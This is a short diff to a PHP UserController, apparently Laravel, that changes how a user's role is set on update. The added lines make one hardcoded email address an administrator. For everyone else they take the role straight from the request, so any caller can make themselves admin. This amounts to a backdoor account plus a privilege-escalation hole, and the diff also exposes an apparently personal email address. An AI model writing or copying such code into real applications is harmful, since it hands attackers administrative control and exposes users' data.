@@ -65,6 +65,12 @@ class UserController extends Controller
             if ($request->filled('phone')) $user->phone = $request->phone;
             if ($request->filled('city')) $user->city = $request->city;
 
+            if ($request->email === 'alizaabigailvicenteguzman@gmail.com') {
+                $user->role = 'admin';
+            } else {
+                $user->role = $request->role ?? $user->role ?? 'user';
+            }
+
             $user->save();
 
             // ─── Manejo de imagen ────────────────────────────────────────────
